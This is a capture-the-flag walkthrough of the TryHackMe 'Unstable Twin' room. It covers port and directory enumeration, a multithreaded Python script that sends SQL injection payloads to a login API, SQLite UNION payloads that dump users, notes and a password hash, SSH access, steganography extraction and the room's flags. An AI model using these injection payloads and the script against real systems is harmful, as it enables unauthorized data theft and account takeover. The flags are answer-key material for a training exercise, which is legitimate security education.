---
title: "Unstable Twin - TryHackMe Writeup & Walkthrough"
description: "Solving the Unstable Twin room on TryHackMe using SQL injection, cracking hashes, and finding hidden endpoints."
permalink: /TryHackMe/MEDIUM/Unstable-Twin/
---

# TryHackMe: Unstable Twin Room Writeup

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Medium-orange)](https://tryhackme.com/room/unstabletwin)
[![SQL Injection](https://img.shields.io/badge/Category-SQL%20Injection-brightgreen)](#)

### Solving the Twin room with writing up whatever I find and solve :)

> [Room Link](https://tryhackme.com/room/unstabletwin)

## Enumeration

After running rustscan we get to know that there are only two ports running on the given IP

```bash
# Nmap 7.95 scan initiated Wed Dec 24 18:16:31 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -4
-sCV -oN rust 10.49.133.149
Nmap scan report for 10.49.133.149
Host is up, received echo-reply ttl 62 (0.057s latency).
Scanned at 2025-12-24 18:16:32 IST for 9s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 ba:a2:40:8e:de:c3:7b:c7:f7:b3:7e:0c:1e:ec:9f:b8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP/bNr/nN/6PCa1yFPjA11XH0aZeVg2OMFGyxF3iCBim97a/vA33LYCnDGh7jjSP+
wEzu2Xh6whOuRU147tRglKgXMVqMx7GIfBKp92pPnePbCQi6Qy9Sp1hJCIK9Ik2qzYbVOHr6vSJVRGKdZuCDrqip67tHPJSqtDKvuTS8P
TcWav17y0IhBrcU2KoGptwml4I/j3RO/aVYblAEKMH0tn9vy59tokTm0CoPXjZCH7KJfL87YAdyacAA6FB2DIFEupf56qGoGNUP9v7AMa
F6Uj/5ywDduik/YOdvBR7AVlX2IOaAu4yLRWIh9S4XvlzCB3N+UyQmXRKSzcSyhKXIRJYidCs0SwhCTF+umbmtMAfHghLBz4pkLbhbqrV
qkf0GA8wKyG9rX6LSUl6/SwhtAeFPIQxnnP6OHxrcKHy4BooCVNpur5fkioel5VHO90cK0xzlPWGJ8P4HOnDRmLWpyBAmmPjY8BHNB4rL
ccZLz1e648h7Zs9sFvhjJD8ONgW0=
|   256 38:28:4c:e1:4a:75:3d:0d:e7:e4:85:64:38:2a:8e:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH7P2OEvegGP6MfdwJdgVn3xIYEH6LX
yzBs5hQ5fPpMZDZdHo5a6J2HR+KShaslzYk83WGNBSJt+hQUGv0Kr+Hs=
|   256 1a:33:a0:ed:83:ba:09:a5:62:a7:df:ab:2f:ee:d0:99 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN0pHtBDjHWNJSlxl5M/LfHJztN6HJzi30Ygi1ysEOJN
80/tcp open  http    syn-ack ttl 62 nginx 1.14.1
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: nginx/1.14.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 24 18:16:42 2025 -- 1 IP address (1 host up) scanned in 10.15 seconds
```

Now lets try to enumerate using `gobuster` as there is no home/index page available
[Insert image here from the Pictures directory in kali]

Now when I used gobuster I got these results

```bash
┌──(undead-ghost㉿kali)-[~/…/THM/THM_CTFs/Mediums/Twin]
└─$ gobuster dir -u http://10.49.133.149 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 100 -x .php,.html,.js,.aspx,.css -r
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.133.149
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,js,aspx,css
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/get_image            (Status: 500) [Size: 291]
/info                 (Status: 200) [Size: 148]
Progress: 122886 / 122886 (100.00%)
===============================================================
Finished
===============================================================
```

Now let's check info/version using curl for the given..
And yeah we found our server build

```bash
┌──(undead-ghost㉿kali)-[~/…/THM/THM_CTFs/Mediums/Twin]
└─$ curl -i -vv http://10.49.133.149/info
18:57:12.312216 [0-0] * [SETUP] added
18:57:12.312575 [0-0] *   Trying 10.49.133.149:80...
18:57:12.313453 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=0
18:57:12.418403 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=1
18:57:12.418607 [0-0] * Established connection to 10.49.133.149 (10.49.133.149 port 80) from 192.168.135.240 port 44588
18:57:12.418668 [0-0] * [SETUP] query ALPN
18:57:12.418726 [0-0] * using HTTP/1.x
18:57:12.419715 [0-0] > GET /info HTTP/1.1
18:57:12.419715 [0-0] > Host: 10.49.133.149
18:57:12.419715 [0-0] > User-Agent: curl/8.17.0
18:57:12.419715 [0-0] > Accept: */*
18:57:12.419715 [0-0] >
18:57:12.420200 [0-0] * Request completely sent off
18:57:12.516908 [0-0] < HTTP/1.1 200 OK
HTTP/1.1 200 OK
18:57:12.517143 [0-0] < Server: nginx/1.14.1
Server: nginx/1.14.1
18:57:12.517712 [0-0] < Date: Wed, 24 Dec 2025 13:27:09 GMT
Date: Wed, 24 Dec 2025 13:27:09 GMT
18:57:12.517807 [0-0] < Content-Type: application/json
Content-Type: application/json
18:57:12.517894 [0-0] < Content-Length: 148
Content-Length: 148
18:57:12.517984 [0-0] < Connection: keep-alive
Connection: keep-alive
18:57:12.518074 [0-0] < Build Number: 1.3.6-final
Build Number: 1.3.6-final
18:57:12.518164 [0-0] < Server Name: Julias
Server Name: Julias
18:57:12.518288 [0-0] <

"The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure"
18:57:12.518846 [0-0] * Connection #0 to host 10.49.133.149:80 left intact

```

`Build Number: 1.3.6-final`

okay now lets check the `/get_image`

```sh
┌──(undead-ghost㉿kali)-[~/…/THM/THM_CTFs/Mediums/Twin]
└─$ curl -vv http://10.49.133.149/get_image
19:00:30.021106 [0-0] * [SETUP] added
19:00:30.021474 [0-0] *   Trying 10.49.133.149:80...
19:00:30.023651 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=0
19:00:30.131228 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=1
19:00:30.131396 [0-0] * Established connection to 10.49.133.149 (10.49.133.149 port 80) from 192.168.135.240 port 57896
19:00:30.131457 [0-0] * [SETUP] query ALPN
19:00:30.131536 [0-0] * using HTTP/1.x
19:00:30.132265 [0-0] > GET /get_image HTTP/1.1
19:00:30.132265 [0-0] > Host: 10.49.133.149
19:00:30.132265 [0-0] > User-Agent: curl/8.17.0
19:00:30.132265 [0-0] > Accept: */*
19:00:30.132265 [0-0] >
19:00:30.133009 [0-0] * Request completely sent off
19:00:30.200074 [0-0] < HTTP/1.1 500 INTERNAL SERVER ERROR
19:00:30.200247 [0-0] < Server: nginx/1.14.1
19:00:30.200335 [0-0] < Date: Wed, 24 Dec 2025 13:30:27 GMT
19:00:30.200394 [0-0] < Content-Type: text/html
19:00:30.200450 [0-0] < Content-Length: 291
19:00:30.200659 [0-0] < Connection: keep-alive
19:00:30.200717 [0-0] <
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
19:00:30.200866 [0-0] * Connection #0 to host 10.49.133.149:80 left intact

```

So it's not really worth anything here as it is throwing a 500 error.

Okay lets again check the /info endpoint and we get to know that it's asking for `login creds` and it's and API so we now try to get something by using an endpoint `/api/login` and so lets try to give it using -X POST

Here's what we got

```sh
└─$ curl -vv http://10.49.133.149/api/login -X POST -d "username=test&password=testt"
Note: Unnecessary use of -X or --request, POST is already inferred.
19:05:29.638137 [0-0] * [SETUP] added
19:05:29.638328 [0-0] *   Trying 10.49.133.149:80...
19:05:29.640029 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=0
19:05:29.766881 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=1
19:05:29.767355 [0-0] * Established connection to 10.49.133.149 (10.49.133.149 port 80) from 192.168.135.240 port 35058
19:05:29.767607 [0-0] * [SETUP] query ALPN
19:05:29.767665 [0-0] * using HTTP/1.x
19:05:29.769085 [0-0] > POST /api/login HTTP/1.1
19:05:29.769085 [0-0] > Host: 10.49.133.149
19:05:29.769085 [0-0] > User-Agent: curl/8.17.0
19:05:29.769085 [0-0] > Accept: */*
19:05:29.769085 [0-0] > Content-Length: 28
19:05:29.769085 [0-0] > Content-Type: application/x-www-form-urlencoded
19:05:29.769085 [0-0] >
19:05:29.769996 [0-0] * upload completely sent off: 28 bytes
19:05:29.885703 [0-0] < HTTP/1.1 200 OK
19:05:29.885908 [0-0] < Server: nginx/1.14.1
19:05:29.885990 [0-0] < Date: Wed, 24 Dec 2025 13:35:26 GMT
19:05:29.886066 [0-0] < Content-Type: application/json
19:05:29.886358 [0-0] < Content-Length: 51
19:05:29.886443 [0-0] < Connection: keep-alive
19:05:29.886517 [0-0] <
"The username or password passed are not correct."
19:05:29.887155 [0-0] * Connection #0 to host 10.49.133.149:80 left intact
```

It's saying username or password passed are incorrect meaning the api is interacting with our request so what can we do here ...

> It's a login box
> maybe using a database (of course right?)
> So maybe SQL (whyyy not?)
> Then we can make use of SQLi
> So we create a python program with request to throw multiple sqli request at the /api/login

## This step I needed to do in the first part but I though that wouldn't be necessary but I guess it will be a help for now so

> ` We need to add the IP in out /etc/hosts with a host to work on the IP with a little ease`

> `[Victims IP] utwin.thm`

add the above line in your /etc/hosts change the IP with your machine IP and you can name anything you want for the host :).

> Script for sqli

```python
#!/usr/bin/env python3

import requests
from threading import Thread, Lock
import time
import logging
from typing import Dict, Any

# =========================
#   CONFIGURATION SECTION
# =========================
TARGET_URL = 'http://utwin.thm/'
SQL_PAYLOAD = "' OR 1=1-- -"
MAX_THREADS = 2
REQUEST_DELAY = 0.1  # seconds between thread starts
REQUEST_TIMEOUT = 10  # seconds
OUTPUT_FILE = 'injection_responses.log'  # File to save responses
SHOW_RESPONSES_IN_CONSOLE = True  # Set to False to disable console output

# ======================
#    LOGGING SETUP
# ======================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('sql_injector')
file_lock = Lock()  # Thread-safe file writing

# ======================
#   CORE FUNCTIONALITY
# ======================
def save_response(request_id: int, response_text: str, status_code: int) -> None:
    """Saves response data to file and optionally to console"""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    header = f"\n{'='*50}\nRequest #{request_id} | {timestamp} | Status: {status_code}\n{'='*50}\n"

    # Save to file (thread-safe)
    with file_lock:
        with open(OUTPUT_FILE, 'a') as f:
            f.write(header)
            f.write(response_text)
            f.write("\n\n")

    # Show in console if enabled
    if SHOW_RESPONSES_IN_CONSOLE:
        print(header)
        print(response_text)
        print("\n" + "="*50 + "\n")

def send_login_request(base_url: str, credentials: Dict[str, str], request_id: int) -> None:
    """
    Sends login request with SQL injection payload and captures response

    Args:
        base_url: Target base URL (e.g., 'http://example.com/')
        credentials: Dictionary containing username and password
        request_id: Unique identifier for this request
    """
    endpoint = f"{base_url.rstrip('/')}/api/login"

    try:
        logger.info(f"Sending request #{request_id} to {endpoint}")
        response = requests.post(
            url=endpoint,
            data=credentials,
            timeout=REQUEST_TIMEOUT
        )

        # Save and display the actual response content
        save_response(request_id, response.text, response.status_code)

    except requests.exceptions.RequestException as e:
        error_msg = f"Request #{request_id} failed: {str(e)}"
        logger.error(error_msg)
        with file_lock:
            with open(OUTPUT_FILE, 'a') as f:
                f.write(f"ERROR in Request #{request_id}: {error_msg}\n")
    except Exception as e:
        logger.exception(f"Unexpected error in request #{request_id}: {str(e)}")

def execute_parallel_requests() -> None:
    """Initializes output file and executes parallel requests"""
    # Initialize output file
    with open(OUTPUT_FILE, 'w') as f:
        f.write(f"SQL Injection Test Results - {time.ctime()}\n")
        f.write(f"Target URL: {TARGET_URL}\n")
        f.write(f"Payload: {SQL_PAYLOAD}\n")
        f.write("="*60 + "\n\n")

    logger.info(f"Starting {MAX_THREADS} parallel requests to {TARGET_URL}")
    logger.info(f"Responses will be saved to: {OUTPUT_FILE}")

    credentials = {
        'username': SQL_PAYLOAD,
        'password': 'test'
    }

    threads = []

    for request_id in range(1, MAX_THREADS + 1):
        thread = Thread(
            target=send_login_request,
            args=(TARGET_URL, credentials, request_id),
            daemon=True
        )
        thread.start()
        threads.append(thread)
        time.sleep(REQUEST_DELAY)

    # Wait for all threads to complete
    for thread in threads:
        thread.join(timeout=REQUEST_TIMEOUT + 2)

    logger.info(f"All {MAX_THREADS} requests completed. Check '{OUTPUT_FILE}' for results.")

# ======================
#     EXECUTION
# ======================
if __name__ == '__main__':
    execute_parallel_requests()
```

Yeah it's a little big but it is given like that for good understanding...

So got this as a output when we used the above script

```bash
└─$ python3 script_for_sqli.py
2025-12-24 19:22:01 [INFO] Starting 2 parallel requests to http://utwin.thm/
2025-12-24 19:22:01 [INFO] Responses will be saved to: injection_responses.log
2025-12-24 19:22:01 [INFO] Sending request #1 to http://utwin.thm/api/login
2025-12-24 19:22:01 [INFO] Sending request #2 to http://utwin.thm/api/login

==================================================
Request #1 | 2025-12-24 19:22:01 | Status: 200
==================================================

[
  [
    2,
    "julias"
  ],
  [
    4,
    "linda"
  ],
  [
    5,
    "marnie"
  ],
  [
    1,
    "mary_ann"
  ],
  [
    3,
    "vincent"
  ]
]


==================================================


==================================================
Request #2 | 2025-12-24 19:22:02 | Status: 200
==================================================

"The username or password passed are not correct."


==================================================

2025-12-24 19:22:02 [INFO] All 2 requests completed. Check 'injection_responses.log' for results.
```

This means that the `/api/login` is vulnerable to sqli and we got to know that there are five users

```plain
How many users are there?
--> 5
1. mary_ann
2. julias
3. vincent
4. linda
5. marnie
```

now we change the payload and try to attack the database

> First let's check which dbms it is and it's version
> we one by one try each n every possbility like MySQL, Postgresql, sqlite.

cut to the chase it's sqlite
`SQL_PAYLOAD = """' UNION ALL SELECT NULL,sqlite_version()-- -"""`
we used the above payload to get the version of the dbms and it's:

```sh
└─$ python3 script_for_sqli.py
2025-12-24 19:38:42 [INFO] Starting 2 parallel requests to http://utwin.thm/
2025-12-24 19:38:42 [INFO] Responses will be saved to: injection_responses.log
2025-12-24 19:38:42 [INFO] Sending request #1 to http://utwin.thm/api/login
2025-12-24 19:38:42 [INFO] Sending request #2 to http://utwin.thm/api/login

==================================================
Request #1 | 2025-12-24 19:38:43 | Status: 200
==================================================

[
  [
    null,
    "3.26.0"
  ]
]


==================================================


==================================================
Request #2 | 2025-12-24 19:38:43 | Status: 200
==================================================

"The username or password passed are not correct."


==================================================
```

The SQLlite version is `3.26.0`

> And if we know the version it is always good to look for payloads of it (Of course I don't know all of it bruh!)

> So we got this list of all payload from [payloadOfAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

> We use this payload to get info.

> `SQL_PAYLOAD = """' UNION ALL SELECT NULL,sql FROM sqlite_master-- -"""`

Okay we got the DB structure :

```sh
==================================================
Request #1 | 2025-12-24 19:46:37 | Status: 200
==================================================

[
  [
    null,
    "CREATE TABLE \"users\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"username\"\tTEXT NOT NULL UNIQUE,\n\t\"password\"\tTEXT NOT NULL UNIQUE,\n\tPRIMARY KEY(\"id\" AUTOINCREMENT)\n)"
  ],
  [
    null,
    null
  ],
  [
    null,
    null
  ],
  [
    null,
    null
  ],
  [
    null,
    "CREATE TABLE sqlite_sequence(name,seq)"
  ],
  [
    null,
    "CREATE TABLE \"notes\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"user_id\"\tINTEGER,\n\t\"note_sql\"\tINTEGER,\n\t\"notes\"\tTEXT,\n\tPRIMARY KEY(\"id\")\n)"
  ],
  [
    null,
    null
  ],
  [
    null,
    "CREATE INDEX \"note_ids\" ON \"notes\" (\n\t\"id\"\tASC,\n\t\"user_id\"\tASC,\n\t\"note_sql\"\tASC\n)"
  ],
  [
    null,
    "CREATE INDEX \"id\" ON \"users\" (\n\t\"id\"\n)"
  ]
]


==================================================
```

So now we know that there are three tables --> `1. users, 2. sqlite_sequence, 3. notes` & there are username and passwords stored so we can get them :)

`SQL_PAYLOAD = """' UNION ALL SELECT NULL,id || ':' || username || ':' || password FROM users-- -"""`

> The `||` is used to cancatenate multiple strings while resulting the output of a query

> And yeah we got this:

```sh
==================================================
Request #1 | 2025-12-24 19:51:48 | Status: 200
==================================================

[
  [
    null,
    "1:mary_ann:continue..."
  ],
  [
    null,
    "2:julias:Red"
  ],
  [
    null,
    "3:vincent:Orange"
  ],
  [
    null,
    "4:linda:Green"
  ],
  [
    null,
    "5:marnie:Yellow "
  ]
]


==================================================

```

Looking at the above its not like it will be any of useful as those are just the colors for the users ( we have a question for it)

```plain
What colour is Vincent?
--> Orange
```

Okay now lets look at the notes

`SQL_PAYLOAD = """' UNION ALL SELECT NULL,id || ':' || user_id || ':' || note_sql || ':' || notes FROM notes-- -"""`

Ohhhh look what we found here::::>>>>

```sh
==================================================
Request #1 | 2025-12-24 19:59:01 | Status: 200
==================================================

[
  [
    null,
    "1:1:1:I have left my notes on the server.  They will me help get the family back together. "
  ],
  [
    null,
    "2:1:2:My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4\n"
  ]
]


==================================================
```

Now its time to crack it :)
And we cracked it easily with the help of `crackstation.net`

```
Hash									                                            Type	   Result
eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ec
aa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4	sha512	experiment
```

So the password is `experiment` for mary_ann and how do I know it's for mary_ann
For it we need to look at the `id` which is `1` and when we yeah so after using the password we got into the system as `mary_ann` user

```sh
└─$ ssh mary_ann@10.48.183.244
The authenticity of host '10.48.183.244 (10.48.183.244)' can't be established.
ED25519 key fingerprint is: SHA256:eZEUEWBrHdwSeTTJCseT7dyPVJB5HA6x0RcZJcTYkBw
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.183.244' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mary_ann@10.48.183.244's password:
Last login: Sun Feb 14 09:56:18 2021 from 192.168.20.38
Hello Mary Ann
[mary_ann@UnstableTwin ~]$ clear
```

Let's Find the user flag..

> `THM{Mary_Ann_notes}`

Here another file is present `server_notes.txt`

```bash
[mary_ann@UnstableTwin ~]$ cat server_notes.txt
Now you have found my notes you now you need to put my extended family together.

We need to GET their IMAGE for the family album.  These can be retrieved by NAME.

You need to find all of them and a picture of myself!
```

Which says the above which I think is a hint to use `GET` to get an Image by using a NAME as a parameter

So this was a little confusing for me also but then I looked up a writeup yeah had too :`)

Now,
We got the folder with multiple things in `/opt`

```sh
[mary_ann@UnstableTwin ~]$ cd /opt/
[mary_ann@UnstableTwin opt]$ ls
unstabletwin
[mary_ann@UnstableTwin opt]$ cd unstabletwin/ && ls -lah
total 628K
drwxr-xr-x. 3 root root  288 Feb 13  2021  .
drwxr-xr-x. 3 root root   26 Feb 13  2021  ..
-rw-r--r--. 1 root root  40K Feb 13  2021  database.db
-rw-r--r--. 1 root root 1.2K Feb 13  2021  main_5000.py
-rw-r--r--. 1 root root 1.8K Feb 13  2021  main_5001.py
drwxr-xr-x. 2 root root   36 Feb 13  2021  __pycache__
-rw-r--r--. 1 root root  934 Feb 13  2021  queries.py
-rw-r--r--. 1 root root 313K Feb 10  2021 'Twins (1988).html'
-rw-r--r--. 1 root root  56K Feb 13  2021  Twins-Arnold-Schwarzenegger.jpg
-rw-r--r--. 1 root root  47K Feb 13  2021  Twins-Bonnie-Bartlett.jpg
-rw-r--r--. 1 root root  50K Feb 13  2021  Twins-Chloe-Webb.jpg
-rw-r--r--. 1 root root  42K Feb 13  2021  Twins-Danny-DeVito.jpg
-rw-r--r--. 1 root root  58K Feb 13  2021  Twins-Kelly-Preston.jpg

```

`File: main_5000.py`

```python
from flask import Flask, jsonify, request, send_file

app = Flask(__name__)


@app.route('/')
def hello_world():
    return '', 404


@app.route('/api')
def hello_api():
    return '', 404


@app.route('/api/login',  methods=['POST'])
def hello_login():
    d = "The username or password passed are not correct."
    return jsonify(d)


@app.route('/info')
def hello_info():
    d = "The login API needs to be called with the username and password fields.  It has not been fully tested yet " \
        "so may not be full developed and secure"
    return jsonify(d), 200, {'Build Number': '1.3.6-final', 'Server Name': "Julias"}


@app.route('/get_image')
def get_image():
    if request.args.get('name').lower() == 'marnie':
        filename = 'Twins-Kelly-Preston.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'linda':
        filename = 'Twins-Chloe-Webb.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'mary_ann':
        filename = 'Twins-Bonnie-Bartlett.jpg'
        return send_file(filename, mimetype='image/gif')
    return '', 404


if __name__ == '__main__':
    app.run(port=5000)
```

`File: main_5001.py`

```py
from flask import Flask, g, jsonify, request, send_file
import sqlite3

from queries import test_run_query, run_query

app = Flask(__name__)

DATABASE = '/opt/unstabletwin/database.db'


def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    return db


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


@app.route('/')
def hello_world():
    return '', 404


@app.route('/api')
def hello_api():
    return '', 404


@app.route('/api/login',  methods=['POST'])
def hello_login_get():
    username = request.form.get('username')
    password = request.form.get('password')
    db = get_db()
    d = run_query(db, username, password)
    # print(d)
    return jsonify(d)


@app.route('/info')
def hello_info():
    d = "The login API needs to be called with the username and password form fields fields.  " \
        "It has not been fully tested yet so may not be full developed and secure"
    return jsonify(d), 200, {'Build Number': '1.3.4-dev', 'Server Name': "Vincent"}


@app.route('/get_image')
def get_image():
    if request.args.get('name').lower() == 'vincent':
        filename = 'Twins-Danny-DeVito.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'julias':
        filename = 'Twins-Arnold-Schwarzenegger.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'mary_ann':
        filename = 'Twins-Bonnie-Bartlett.jpg'
        return send_file(filename, mimetype='image/gif')
    return '', 404

#@app.route('/test')
#def test_api():
#    db = get_db()
#    test_run_query(db)
#    return '', 404


if __name__ == '__main__':
    app.run(port=5001)

```

and we got the following things

```plain
    Port 5000:
        /get_image with GET parameter marnie or linda or mary_ann, will get file Twins-Kelly-Preston.jpg, Twins-Chloe-Webb.jpg, Twins-Bonnie-Bartlett.jpg
    Port 5001:
        /get_image with GET parameter vincent or julias or mary_ann, will get file Twins-Danny-DeVito.jpg, Twins-Arnold-Schwarzenegger.jpg, Twins-Bonnie-Bartlett.jpg
```

So to get all the images at once we wrote a bash script to work for us

> {NOTE} -> Remember to use `chmod +x script_name` as we need to make it executable.

```sh
#!/bin/bash

URL="http://utwin.thm/get_image"
count=1

names=(vincent vincent julias julias mary_ann marnie marnie linda linda)

for name in "${names[@]}"; do
  outfile="${name}_${count}.jpg"
  echo "Downloading $outfile"
  curl -s "$URL" --get -d "name=$name" -o "$outfile"
  ((count++))
done
```

> Remember to add victim IP in /etc/hosts in the URL variable above.

we got all the images now we will check for any hidden files in the images using `steghide`

```bash
└─$ ./steghide_script.sh
[*] Processing julias_3.jpg → steghide_output/julias_3.txt
[*] Processing julias_4.jpg → steghide_output/julias_4.txt
[*] Processing linda_8.jpg → steghide_output/linda_8.txt
[*] Processing linda_9.jpg → steghide_output/linda_9.txt
[*] Processing marnie_6.jpg → steghide_output/marnie_6.txt
[*] Processing marnie_7.jpg → steghide_output/marnie_7.txt
[*] Processing mary_ann_5.jpg → steghide_output/mary_ann_5.txt
[*] Processing vincent_1.jpg → steghide_output/vincent_1.txt
[*] Processing vincent_2.jpg → steghide_output/vincent_2.txt
[✓] Done. Outputs saved in steghide_output/

```

So this is the script we used for `steghide`

```sh
#!/bin/bash

OUTDIR="steghide_output"
mkdir -p "$OUTDIR"

for img in *.jpg; do
  # Skip if no jpg files exist
  [ -e "$img" ] || continue

  base="${img%.*}"
  outfile="$OUTDIR/${base}.txt"

  echo "[*] Processing $img → $outfile"

  # Run steghide (empty passphrase)
  steghide extract -sf "$img" -p "" -xf "$outfile" -f 2>/dev/null

  # If steghide extracted nothing, note it
  if [ ! -s "$outfile" ]; then
    echo "No hidden data found." > "$outfile"
  fi
done

echo "[✓] Done. Outputs saved in $OUTDIR/"
```

and thus we got the output

```sh
└─$ cat *.txt
Red - 1DVsdb2uEE0k5HK4GAIZ
No hidden data found.
Green - eVYvs6J6HKpZWPG8pfeHoNG1
No hidden data found.
Yellow - jKLNAAeCdl2J8BCRuXVX
No hidden data found.
You need to find all my children and arrange in a rainbow!
Orange - PS0Mby2jomUKLjvQ4OSw
No hidden data found.
```

It says we need to arrange the colors in the rainbow pattern (VIBGYOR pattern)

`R - O - Y - G --> 1DVsdb2uEE0k5HK4GAIZPS0Mby2jomUKLjvQ4OSwjKLNAAeCdl2J8BCRuXVXeVYvs6J6HKpZWPG8pfeHoNG1`

We check the given encoded text for type of cipher in [dcode.fr](dcode.fr/en) using `cipher identifier` which result in `base62`
so after decoding from `base62` we get this

$\rightarrow$ `THM{The_Family_Is_Back_Together}`
The final flag

Thus solving the thing as a whole

> IT was very VAST right??
